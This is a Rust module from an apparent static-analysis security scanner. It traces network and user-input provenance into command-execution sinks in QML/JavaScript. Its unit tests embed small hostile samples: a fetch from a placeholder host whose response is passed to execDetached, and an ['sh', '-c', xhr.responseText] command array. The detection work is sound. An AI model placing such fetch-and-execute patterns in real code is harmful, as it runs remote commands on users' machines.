//! Bounded intra-file QML/JavaScript value flow.
//!
//! This is intentionally a small abstract interpreter, not a JavaScript
//! engine.  It follows local declarations/assignments in source order and
//! recognizes a few verified network and user-input producers.  Every bound
//! is explicit and exhaustion is surfaced to the caller as partial coverage.

use std::collections::BTreeSet;
use std::time::Instant;

use omasafe_core::bounds::{
    DATAFLOW_TIME_BUDGET, MAX_DATAFLOW_ASSIGNMENT_DEPTH, MAX_DATAFLOW_STATEMENTS,
};

use super::strings::decode_js_escapes;

/// Abstract runtime provenance of an expression.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) enum FlowValue {
    Static(String),
    Network,
    UserInput,
    Dynamic,
    Unknown,
}

#[derive(Clone)]
struct Binding {
    name: String,
    offset: usize,
    value: FlowValue,
    assignment_depth: usize,
    scope_start: usize,
    scope_end: usize,
}

#[derive(Clone)]
struct CallbackParameter {
    name: String,
    body_start: usize,
    body_end: usize,
    network: bool,
}

#[derive(Clone, Copy)]
enum CandidateKind {
    Variable,
    Assignment,
    QmlBinding,
    QmlProperty,
}

#[derive(Clone, Copy)]
struct Candidate<'a> {
    node: tree_sitter::Node<'a>,
    kind: CandidateKind,
}

/// Per-file facts used by the AST detector.  The tree-sitter nodes are only
/// held while `build` runs; the resulting facts contain offsets and abstract
/// values, so callers can classify sink nodes without lifetime coupling.
pub(in crate::detect) struct DataflowFacts {
    bindings: Vec<Binding>,
    callbacks: Vec<CallbackParameter>,
    exhausted: BTreeSet<&'static str>,
    deadline: Instant,
}

#[derive(Clone, Copy)]
struct ScopeSpan {
    start: usize,
    end: usize,
}

impl DataflowFacts {
    pub(in crate::detect) fn build(source: &str, tree: &tree_sitter::Tree) -> Self {
        let started = Instant::now();
        let mut facts = Self {
            bindings: Vec::new(),
            callbacks: Vec::new(),
            exhausted: BTreeSet::new(),
            deadline: started + DATAFLOW_TIME_BUDGET,
        };

        let mut candidates: Vec<Candidate<'_>> = Vec::new();
        let mut scopes = vec![ScopeSpan {
            start: tree.root_node().start_byte(),
            end: tree.root_node().end_byte(),
        }];
        let mut stack = vec![tree.root_node()];
        let mut statement_count = 0usize;
        while let Some(node) = stack.pop() {
            if facts.time_exceeded() {
                break;
            }
            if is_statement_like(node.kind()) {
                statement_count += 1;
                if statement_count > MAX_DATAFLOW_STATEMENTS {
                    facts.exhausted.insert("statement-limit");
                    break;
                }
            }
            if is_scope_node(node.kind()) {
                scopes.push(ScopeSpan {
                    start: node.start_byte(),
                    end: node.end_byte(),
                });
            }
            match node.kind() {
                "variable_declarator" => {
                    candidates.push(Candidate {
                        node,
                        kind: CandidateKind::Variable,
                    });
                }
                "assignment_expression" => {
                    candidates.push(Candidate {
                        node,
                        kind: CandidateKind::Assignment,
                    });
                }
                "ui_binding" => {
                    candidates.push(Candidate {
                        node,
                        kind: CandidateKind::QmlBinding,
                    });
                }
                "ui_property" => {
                    candidates.push(Candidate {
                        node,
                        kind: CandidateKind::QmlProperty,
                    });
                }
                "function_declaration" | "function_expression" | "arrow_function" => {
                    facts.collect_callback(source, node);
                }
                _ => {}
            }
            let mut cursor = node.walk();
            stack.extend(node.children(&mut cursor));
        }

        candidates.sort_by_key(|candidate| candidate.node.start_byte());
        for candidate in candidates {
            if facts.time_exceeded() {
                break;
            }
            let (name_node, value_node) = match candidate.kind {
                CandidateKind::Variable => (
                    candidate.node.child_by_field_name("name"),
                    candidate.node.child_by_field_name("value"),
                ),
                CandidateKind::Assignment => (
                    candidate.node.child_by_field_name("left"),
                    candidate.node.child_by_field_name("right"),
                ),
                CandidateKind::QmlBinding => (
                    candidate.node.child_by_field_name("name"),
                    candidate.node.child_by_field_name("value"),
                ),
                CandidateKind::QmlProperty => (
                    candidate.node.child_by_field_name("name"),
                    candidate
                        .node
                        .child_by_field_name("value")
                        .and_then(|value| {
                            let mut cursor = value.walk();
                            value
                                .children(&mut cursor)
                                .find(|child| child.is_named())
                                .or(Some(value))
                        }),
                ),
            };
            let (Some(name_node), Some(value_node)) = (name_node, value_node) else {
                continue;
            };
            let name = node_text(source, name_node)
                .trim_matches(['(', ')'])
                .trim()
                .to_owned();
            if name.is_empty() || name.contains(',') {
                continue;
            }
            let value = facts.eval(source, value_node, 0);
            let assignment_depth = facts.assignment_depth(source, value_node, 0);
            if assignment_depth > MAX_DATAFLOW_ASSIGNMENT_DEPTH {
                facts.exhausted.insert("assignment-depth-limit");
            }
            facts.bindings.push(Binding {
                name,
                offset: candidate.node.start_byte(),
                value,
                assignment_depth,
                scope_start: scope_for(candidate.node, &scopes).start,
                scope_end: scope_for(candidate.node, &scopes).end,
            });
        }

        facts
    }

    /// Classify a sink expression at its source position.  Assignments after
    /// the sink cannot influence it; the latest earlier binding wins.
    pub(in crate::detect) fn classify(
        &mut self,
        source: &str,
        node: tree_sitter::Node<'_>,
    ) -> FlowValue {
        // Literal sink values are independently decidable even when the
        // bounded provenance pass has exhausted its wall-clock budget. Keep
        // them available for reference rejection/finding classification and
        // argv-head checks; otherwise a busy host can turn a literal into a
        // spurious `coverage-unknown` result.
        let node = unwrap_transparent(node);
        if let Some(value) = static_literal_value(source, node) {
            return value;
        }
        if self.time_exceeded()
            || self.exhausted.contains("statement-limit")
            || self.exhausted.contains("assignment-depth-limit")
        {
            return FlowValue::Unknown;
        }
        self.eval(source, node, 0)
    }

    pub(in crate::detect) fn limitations(&self) -> impl Iterator<Item = &'static str> + '_ {
        self.exhausted.iter().copied()
    }

    fn time_exceeded(&mut self) -> bool {
        if Instant::now() >= self.deadline {
            self.exhausted.insert("time-limit");
            true
        } else {
            false
        }
    }

    fn collect_callback(&mut self, source: &str, node: tree_sitter::Node<'_>) {
        let Some(body) = node.child_by_field_name("body") else {
            return;
        };
        let mut names = Vec::new();
        if let Some(parameter) = node.child_by_field_name("parameter") {
            names.push(node_text(source, parameter).to_owned());
        }
        if let Some(parameters) = node.child_by_field_name("parameters") {
            let mut cursor = parameters.walk();
            for child in parameters.children(&mut cursor) {
                if let Some(name) = child
                    .child_by_field_name("name")
                    .or_else(|| child.child_by_field_name("pattern"))
                {
                    let text = node_text(source, name).trim().to_owned();
                    if !text.is_empty() && text != "this" {
                        names.push(text);
                    }
                }
            }
        }
        if names.is_empty() {
            return;
        }
        let network = callback_is_network(node, source);
        for name in names {
            self.callbacks.push(CallbackParameter {
                name,
                body_start: body.start_byte(),
                body_end: body.end_byte(),
                network,
            });
        }
    }

    fn eval(&mut self, source: &str, node: tree_sitter::Node<'_>, depth: usize) -> FlowValue {
        if self.time_exceeded() {
            return FlowValue::Unknown;
        }
        if depth > MAX_DATAFLOW_ASSIGNMENT_DEPTH {
            self.exhausted.insert("assignment-depth-limit");
            return FlowValue::Unknown;
        }
        let node = unwrap_transparent(node);
        match node.kind() {
            "string" => FlowValue::Static(string_content(source, node)),
            "template_string" => {
                let mut result = String::new();
                let mut dynamic = None;
                let mut cursor = node.walk();
                for child in node.children(&mut cursor) {
                    match child.kind() {
                        "string_fragment" => result.push_str(node_text(source, child)),
                        "escape_sequence" => {
                            result.push_str(&decode_js_escapes(node_text(source, child)))
                        }
                        "template_substitution" => {
                            let Some(expression) = child.named_child(0) else {
                                dynamic = Some(FlowValue::Unknown);
                                continue;
                            };
                            match self.eval(source, expression, depth + 1) {
                                FlowValue::Static(text) => result.push_str(&text),
                                value => dynamic = Some(value),
                            }
                        }
                        _ => {}
                    }
                }
                dynamic.unwrap_or(FlowValue::Static(result))
            }
            "identifier" | "property_identifier" => {
                let name = node_text(source, node);
                if let Some(callback) = self.callbacks.iter().rev().find(|callback| {
                    node.start_byte() >= callback.body_start
                        && node.start_byte() <= callback.body_end
                        && callback.name == name
                }) {
                    return if callback.network {
                        FlowValue::Network
                    } else {
                        FlowValue::UserInput
                    };
                }
                self.bindings
                    .iter()
                    .rev()
                    .find(|binding| {
                        binding.offset < node.start_byte()
                            && binding.name == name
                            && binding_contains(binding, node)
                    })
                    .map(|binding| binding.value.clone())
                    .unwrap_or_else(|| {
                        if user_input_name(name) {
                            FlowValue::UserInput
                        } else {
                            FlowValue::Unknown
                        }
                    })
            }
            "member_expression" => {
                let object = node.child_by_field_name("object");
                let property = node.child_by_field_name("property");
                let property_name = property.map(|property| node_text(source, property));
                let object_text = object.map(|object| node_text(source, object));
                let object_value = object.map(|object| self.eval(source, object, depth + 1));
                match property_name {
                    Some("responseText") | Some("response") | Some("body") => {
                        if matches!(object_value, Some(FlowValue::Network))
                            || object_text.is_some_and(network_object_name)
                        {
                            FlowValue::Network
                        } else {
                            FlowValue::Dynamic
                        }
                    }
                    Some("input") | Some("value") | Some("textContent")
                        if object.is_some_and(|object| {
                            matches!(object.kind(), "identifier" | "member_expression")
                        }) =>
                    {
                        FlowValue::UserInput
                    }
                    Some("inputMethod") | Some("clipboard") => FlowValue::UserInput,
                    _ => object_value.unwrap_or(FlowValue::Unknown),
                }
            }
            "call_expression" => {
                let function = node.child_by_field_name("function");
                let function_name = function.and_then(|function| {
                    function
                        .child_by_field_name("property")
                        .or(Some(function))
                        .map(|node| node_text(source, node))
                });
                let receiver_value = function
                    .and_then(|function| function.child_by_field_name("object"))
                    .map(|object| self.eval(source, object, depth + 1));
                match function_name {
                    Some("fetch") | Some("urlopen") | Some("readFile") | Some("readText") => {
                        FlowValue::Network
                    }
                    Some("text") | Some("json") | Some("arrayBuffer")
                        if matches!(receiver_value, Some(FlowValue::Network))
                            || function
                                .and_then(|function| function.child_by_field_name("object"))
                                .is_some_and(|object| {
                                    matches!(
                                        node_text(source, object),
                                        "response" | "xhr" | "request" | "reply" | "data"
                                    )
                                }) =>
                    {
                        FlowValue::Network
                    }
                    _ => FlowValue::Dynamic,
                }
            }
            "binary_expression" | "sequence_expression" => {
                let mut cursor = node.walk();
                let values: Vec<FlowValue> = node
                    .children(&mut cursor)
                    .filter(|child| child.is_named())
                    .map(|child| self.eval(source, child, depth + 1))
                    .collect();
                combine_values(values)
            }
            "array" => {
                let mut cursor = node.walk();
                let values: Vec<FlowValue> = node
                    .children(&mut cursor)
                    .filter(|child| child.is_named())
                    .map(|child| self.eval(source, child, depth + 1))
                    .collect();
                combine_values_with_separator(values, " ")
            }
            "assignment_expression" => node
                .child_by_field_name("right")
                .map(|right| self.eval(source, right, depth + 1))
                .unwrap_or(FlowValue::Unknown),
            "ternary_expression" => {
                let mut cursor = node.walk();
                let values: Vec<FlowValue> = node
                    .children(&mut cursor)
                    .filter(|child| child.is_named())
                    .skip(1)
                    .map(|child| self.eval(source, child, depth + 1))
                    .collect();
                combine_values(values)
            }
            "parenthesized_expression" | "expression_statement" => node
                .named_child(0)
                .map(|child| self.eval(source, child, depth + 1))
                .unwrap_or(FlowValue::Unknown),
            _ => FlowValue::Dynamic,
        }
    }

    /// Compute the maximum assignment/expression depth contributing to a
    /// value. Bindings are evaluated in source order, so following a prior
    /// identifier adds one level without retaining tree nodes in the facts.
    fn assignment_depth(&self, source: &str, node: tree_sitter::Node<'_>, depth: usize) -> usize {
        if depth > MAX_DATAFLOW_ASSIGNMENT_DEPTH {
            return depth;
        }
        let node = unwrap_transparent(node);
        match node.kind() {
            "identifier" | "property_identifier" => self
                .bindings
                .iter()
                .rev()
                .find(|binding| {
                    binding.offset < node.start_byte()
                        && binding.name == node_text(source, node)
                        && binding_contains(binding, node)
                })
                .map(|binding| binding.assignment_depth + 1)
                .unwrap_or(depth),
            "assignment_expression" => node
                .child_by_field_name("right")
                .map(|right| self.assignment_depth(source, right, depth + 1))
                .unwrap_or(depth),
            "member_expression" => node
                .child_by_field_name("object")
                .map(|object| self.assignment_depth(source, object, depth + 1))
                .unwrap_or(depth),
            "binary_expression" | "sequence_expression" | "array" | "ternary_expression" => {
                let mut cursor = node.walk();
                node.children(&mut cursor)
                    .filter(|child| child.is_named())
                    .map(|child| self.assignment_depth(source, child, depth + 1))
                    .max()
                    .unwrap_or(depth)
            }
            _ => depth,
        }
    }
}

fn is_statement_like(kind: &str) -> bool {
    kind.ends_with("_statement")
        || matches!(
            kind,
            "variable_declaration" | "lexical_declaration" | "ui_binding" | "ui_property"
        )
}

fn is_scope_node(kind: &str) -> bool {
    matches!(
        kind,
        "ui_object_definition"
            | "function_declaration"
            | "function_expression"
            | "arrow_function"
            | "statement_block"
            | "class_body"
            | "switch_body"
            | "catch_clause"
    )
}

fn scope_for(node: tree_sitter::Node<'_>, scopes: &[ScopeSpan]) -> ScopeSpan {
    scopes
        .iter()
        .copied()
        .filter(|scope| scope.start <= node.start_byte() && node.end_byte() <= scope.end)
        .min_by_key(|scope| scope.end - scope.start)
        .unwrap_or(ScopeSpan {
            start: node.start_byte(),
            end: node.end_byte(),
        })
}

fn binding_contains(binding: &Binding, node: tree_sitter::Node<'_>) -> bool {
    binding.scope_start <= node.start_byte() && node.end_byte() <= binding.scope_end
}

fn callback_is_network(node: tree_sitter::Node<'_>, source: &str) -> bool {
    let Some(parent) = node.parent() else {
        return false;
    };
    if parent.kind() == "arguments"
        && let Some(call) = parent.parent()
        && call.kind() == "call_expression"
        && let Some(function) = call.child_by_field_name("function")
        && let Some(property) = function.child_by_field_name("property")
    {
        return matches!(node_text(source, property), "then" | "catch" | "finally")
            && function
                .child_by_field_name("object")
                .is_some_and(|receiver| expression_is_network(source, receiver));
    }
    if parent.kind() == "assignment_expression"
        && let Some(left) = parent.child_by_field_name("left")
        && let Some(property) = left.child_by_field_name("property")
    {
        return matches!(
            node_text(source, property),
            "onreadystatechange" | "onload" | "onmessage"
        );
    }
    false
}

/// A callback parameter is network data only when the promise/event receiver
/// is itself a recognized network producer. In particular,
/// `Promise.resolve("date").then(...)` is not a network response merely
/// because the method name is `then`.
///
/// Promise chains retain network provenance only when the callback returns a
/// network-derived value. That makes `fetch(...).then(r => r.text()).then(...)`
/// network-tainted while keeping a callback that returns a fixed value from
/// laundering the provenance into the next callback.
fn expression_is_network(source: &str, node: tree_sitter::Node<'_>) -> bool {
    expression_is_network_at_depth(source, node, 0)
}

fn expression_is_network_at_depth(source: &str, node: tree_sitter::Node<'_>, depth: usize) -> bool {
    if depth > MAX_DATAFLOW_ASSIGNMENT_DEPTH {
        return false;
    }
    let node = unwrap_transparent(node);
    match node.kind() {
        "identifier" | "property_identifier" => network_object_name(node_text(source, node)),
        "member_expression" => {
            let object = node.child_by_field_name("object");
            let property = node.child_by_field_name("property");
            property.is_some_and(|property| {
                matches!(
                    node_text(source, property),
                    "response" | "responseText" | "body" | "data"
                ) && object
                    .is_some_and(|object| expression_is_network_at_depth(source, object, depth + 1))
            }) || network_object_name(node_text(source, node))
        }
        "call_expression" => {
            let Some(function) = node.child_by_field_name("function") else {
                return false;
            };
            if matches!(node_text(source, function), "fetch" | "urlopen") {
                return true;
            }
            let Some(property) = function.child_by_field_name("property") else {
                return false;
            };
            let Some(receiver) = function.child_by_field_name("object") else {
                return false;
            };
            if matches!(node_text(source, property), "text" | "json" | "arrayBuffer") {
                return expression_is_network_at_depth(source, receiver, depth + 1);
            }
            if matches!(node_text(source, property), "then" | "catch" | "finally") {
                return expression_is_network_at_depth(source, receiver, depth + 1)
                    && node
                        .child_by_field_name("arguments")
                        .and_then(|arguments| arguments.named_child(0))
                        .is_some_and(|callback| {
                            callback_return_is_network(source, callback, depth + 1)
                        });
            }
            false
        }
        "new_expression" => node.named_child(0).is_some_and(|constructor| {
            matches!(
                node_text(source, constructor),
                "XMLHttpRequest" | "WebSocket"
            )
        }),
        "assignment_expression" => node
            .child_by_field_name("right")
            .is_some_and(|right| expression_is_network_at_depth(source, right, depth + 1)),
        _ => false,
    }
}

fn callback_return_is_network(source: &str, callback: tree_sitter::Node<'_>, depth: usize) -> bool {
    if depth > MAX_DATAFLOW_ASSIGNMENT_DEPTH {
        return false;
    }
    let Some(body) = callback.child_by_field_name("body") else {
        return false;
    };
    if body.kind() != "statement_block" {
        return expression_is_network_at_depth(source, body, depth + 1);
    }
    let mut stack = vec![body];
    let mut visited = 0usize;
    while let Some(node) = stack.pop() {
        visited += 1;
        if visited > MAX_DATAFLOW_STATEMENTS {
            return false;
        }
        if node.kind() == "return_statement" {
            return node
                .child_by_field_name("argument")
                .or_else(|| node.named_child(0))
                .is_some_and(|value| expression_is_network_at_depth(source, value, depth + 1));
        }
        let mut cursor = node.walk();
        stack.extend(node.children(&mut cursor));
    }
    false
}

fn user_input_name(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    [
        "input",
        "user",
        "argv",
        "args",
        "stdin",
        "clipboard",
        "selection",
        "env",
    ]
    .iter()
    .any(|needle| lower == *needle || lower.contains(needle))
}

fn combine_values(values: Vec<FlowValue>) -> FlowValue {
    combine_values_with_separator(values, "")
}

fn combine_values_with_separator(values: Vec<FlowValue>, separator: &str) -> FlowValue {
    let mut static_text = String::new();
    let mut saw_static = false;
    let mut saw_network = false;
    let mut saw_user = false;
    let mut saw_unknown = false;
    let mut saw_dynamic = false;
    for value in values {
        match value {
            FlowValue::Static(text) => {
                if static_text.len() < 16 * 1024 {
                    if saw_static && !separator.is_empty() {
                        static_text.push_str(separator);
                    }
                    static_text.push_str(&text);
                }
                saw_static = true;
            }
            FlowValue::Network => saw_network = true,
            FlowValue::UserInput => saw_user = true,
            FlowValue::Unknown => saw_unknown = true,
            FlowValue::Dynamic => saw_dynamic = true,
        }
    }
    if !saw_network && !saw_user && !saw_unknown && !saw_dynamic {
        return FlowValue::Static(static_text);
    }
    // Preserve taint when a sink value combines a fixed command prefix with
    // network/user data (`["sh", "-c", responseText]`). The sink's
    // provenance is still untrusted even though the whole expression is not
    // a single abstract value.
    if saw_network && !saw_user && !saw_unknown && !saw_dynamic {
        return FlowValue::Network;
    }
    if saw_user && !saw_network && !saw_unknown && !saw_dynamic {
        return FlowValue::UserInput;
    }
    if saw_static || saw_network || saw_user {
        FlowValue::Dynamic
    } else {
        FlowValue::Unknown
    }
}

fn network_object_name(text: &str) -> bool {
    let name = text
        .rsplit('.')
        .next()
        .unwrap_or(text)
        .trim_matches(['(', ')'])
        .to_ascii_lowercase();
    matches!(
        name.as_str(),
        "xhr" | "xmlhttprequest" | "response" | "request" | "reply" | "data"
    )
}

fn unwrap_transparent(mut node: tree_sitter::Node<'_>) -> tree_sitter::Node<'_> {
    loop {
        if !matches!(
            node.kind(),
            "expression_statement" | "parenthesized_expression"
        ) {
            return node;
        }
        let Some(child) = node.named_child(0) else {
            return node;
        };
        node = child;
    }
}

fn node_text<'a>(source: &'a str, node: tree_sitter::Node<'_>) -> &'a str {
    &source[node.start_byte()..node.end_byte()]
}

fn string_content(source: &str, node: tree_sitter::Node<'_>) -> String {
    let mut result = String::new();
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        match child.kind() {
            "string_fragment" => result.push_str(node_text(source, child)),
            "escape_sequence" => result.push_str(&decode_js_escapes(node_text(source, child))),
            _ => {}
        }
    }
    result
}

fn static_literal_value(source: &str, node: tree_sitter::Node<'_>) -> Option<FlowValue> {
    match node.kind() {
        "string" => Some(FlowValue::Static(string_content(source, node))),
        "template_string" => {
            let mut cursor = node.walk();
            if node
                .children(&mut cursor)
                .any(|child| child.kind() == "template_substitution")
            {
                None
            } else {
                Some(FlowValue::Static(string_content(source, node)))
            }
        }
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn combines_network_assignment_into_sink_provenance() {
        let source = r#"Item { Component.onCompleted: {
            var d = xhr.responseText;
            Quickshell.execDetached(d)
        } }"#;
        let tree = crate::qml::parse_qml(source.as_bytes()).expect("tree");
        let mut facts = DataflowFacts::build(source, &tree);
        let call = find_call(tree.root_node(), source, "execDetached").expect("call");
        let args = call.child_by_field_name("arguments").expect("args");
        let value = args.named_child(0).expect("arg");
        assert_eq!(facts.classify(source, value), FlowValue::Network);
    }

    #[test]
    fn mixed_static_and_network_values_remain_network_tainted() {
        let source = r#"Item {
            Process { command: ["sh", "-c", xhr.responseText] }
        }"#;
        let tree = crate::qml::parse_qml(source.as_bytes()).expect("tree");
        let mut facts = DataflowFacts::build(source, &tree);
        let array = find_kind(tree.root_node(), "array").expect("command array");
        assert_eq!(facts.classify(source, array), FlowValue::Network);
    }

    #[test]
    fn unrelated_body_property_is_not_network_provenance() {
        let source = r#"Item { Process { command: foo.body } }"#;
        let tree = crate::qml::parse_qml(source.as_bytes()).expect("tree");
        let mut facts = DataflowFacts::build(source, &tree);
        let member = find_kind(tree.root_node(), "member_expression").expect("member");
        assert_eq!(facts.classify(source, member), FlowValue::Dynamic);
    }

    #[test]
    fn promise_callback_parameter_keeps_network_provenance() {
        let source = r#"Item {
            Component.onCompleted: xhr.then(function (response) {
                Quickshell.execDetached(response.text())
            })
        }"#;
        let tree = crate::qml::parse_qml(source.as_bytes()).expect("tree");
        let mut facts = DataflowFacts::build(source, &tree);
        let call = find_call(tree.root_node(), source, "execDetached").expect("call");
        let args = call.child_by_field_name("arguments").expect("args");
        let value = args.named_child(0).expect("arg");
        assert_eq!(facts.classify(source, value), FlowValue::Network);
    }

    #[test]
    fn chained_promise_callback_return_keeps_network_provenance() {
        let source = r#"Item {
            Component.onCompleted: fetch("https://example.test/command")
                .then(response => response.text())
                .then(command => Quickshell.execDetached(command))
        }"#;
        let tree = crate::qml::parse_qml(source.as_bytes()).expect("tree");
        let mut facts = DataflowFacts::build(source, &tree);
        let call = find_call(tree.root_node(), source, "execDetached").expect("call");
        let args = call.child_by_field_name("arguments").expect("args");
        let value = args.named_child(0).expect("arg");
        assert_eq!(facts.classify(source, value), FlowValue::Network);
    }

    #[test]
    fn resolved_promise_does_not_launder_static_value_into_network_provenance() {
        let source = r#"Item {
            Component.onCompleted: Promise.resolve("date").then(value => Quickshell.execDetached(value))
        }"#;
        let tree = crate::qml::parse_qml(source.as_bytes()).expect("tree");
        let mut facts = DataflowFacts::build(source, &tree);
        let call = find_call(tree.root_node(), source, "execDetached").expect("call");
        let args = call.child_by_field_name("arguments").expect("args");
        let value = args.named_child(0).expect("arg");
        assert_eq!(facts.classify(source, value), FlowValue::UserInput);
    }

    fn find_call<'a>(
        node: tree_sitter::Node<'a>,
        source: &str,
        needle: &str,
    ) -> Option<tree_sitter::Node<'a>> {
        if node.kind() == "call_expression"
            && node
                .child_by_field_name("function")
                .is_some_and(|function| node_text(source, function).ends_with(needle))
        {
            return Some(node);
        }
        let mut cursor = node.walk();
        node.children(&mut cursor)
            .find_map(|child| find_call(child, source, needle))
    }

    fn find_kind<'a>(node: tree_sitter::Node<'a>, kind: &str) -> Option<tree_sitter::Node<'a>> {
        if node.kind() == kind {
            return Some(node);
        }
        let mut cursor = node.walk();
        node.children(&mut cursor)
            .find_map(|child| find_kind(child, kind))
    }
}
